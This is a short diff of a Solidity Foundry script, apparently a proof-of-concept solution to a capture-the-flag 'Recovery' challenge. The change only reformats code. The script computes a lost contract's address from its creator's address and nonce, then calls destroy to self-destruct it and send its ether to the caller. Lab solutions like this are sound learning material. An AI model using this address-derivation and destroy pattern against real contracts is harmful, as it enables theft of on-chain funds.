@@ -10,7 +10,9 @@ contract RecoveryPOCScript is Script {
     function run() external {
         vm.startBroadcast();
 
-        address lostcontract = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(INSTANCE), bytes1(0x01))))));
+        address lostcontract = address(
+            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(INSTANCE), bytes1(0x01)))))
+        );
         ISimpleToken(lostcontract).destroy(payable(msg.sender));
 
         vm.stopBroadcast();
